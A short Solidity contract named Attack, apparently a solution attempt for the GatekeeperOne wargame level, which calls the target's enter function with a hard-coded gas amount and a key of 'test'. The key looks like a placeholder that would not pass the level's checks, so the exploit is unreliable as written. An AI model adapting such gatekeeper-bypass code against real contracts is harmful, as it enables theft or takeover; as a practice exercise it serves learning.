// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract Attack {
    address public owner;
    GatekeeperOne public gatekeeperOneContract;

    constructor(address _gatekeeperOneContract) {
        gatekeeperOneContract = GatekeeperOne(_gatekeeperOneContract);

        owner = msg.sender;
    }

    function attack() public {
        bytes8 key = "test";
        gatekeeperOneContract.enter{gas: 8696}(key);
    }
}
